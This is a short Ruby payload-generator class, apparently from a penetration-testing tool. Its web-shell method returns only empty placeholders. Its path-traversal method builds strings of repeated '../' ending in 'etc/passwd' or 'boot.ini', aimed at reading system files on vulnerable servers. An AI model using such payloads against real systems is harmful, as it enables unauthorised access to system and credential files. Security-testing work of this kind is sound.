
class Gpayloads
  def initialize

  end
  @@instance = Gpayloads.new

  def self.instance
    @@instance
  end

  def getOneLineWebShell lang
    result = ""
    case lang
    when 'php'
      result = ""
    when 'jsp'
      result = ""
    when 'asp'
      result = ""
    else
      result = ""
    end
    result
  end

  def getPathTraversal platform, trav, count
    result = ""
    temp = ""
    if trav.nil?
      trav = '../'
    end

    case platform
    when 'window'
      result = 'boot.ini'
    when 'mac'
      result = 'etc/passwd'
    else
      result = 'etc/passwd'
    end

    for i in 1..count
      temp += trav
    end

    temp+result
  end
end